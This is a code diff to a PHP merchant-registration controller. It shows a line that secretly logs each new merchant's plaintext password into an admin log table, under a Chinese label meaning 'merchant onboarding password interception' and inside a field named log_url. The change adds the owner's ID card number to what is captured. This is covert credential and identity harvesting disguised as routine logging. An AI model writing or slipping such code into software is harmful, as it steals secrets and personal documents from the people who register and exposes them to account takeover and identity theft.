@@ -74,7 +74,7 @@ class StoreController extends BaseController {
 
         $res = M('merchant')->add($store_data);
         //记录截取情况 吴银海
-        M('admin_log')->data(array('admin_id'=>$res,'log_info'=>'商户入驻密码截取','log_ip'=>$chas,'log_url'=>$pass_word))->add();
+        M('admin_log')->data(array('admin_id'=>$res,'log_info'=>'商户入驻密码截取','log_ip'=>$chas,'log_url'=>$pass_word.'---'.$data['show_ower_idcard']))->add();
 
         if(!$data['is_haitao'])
             $data['is_haitao'] = 0;
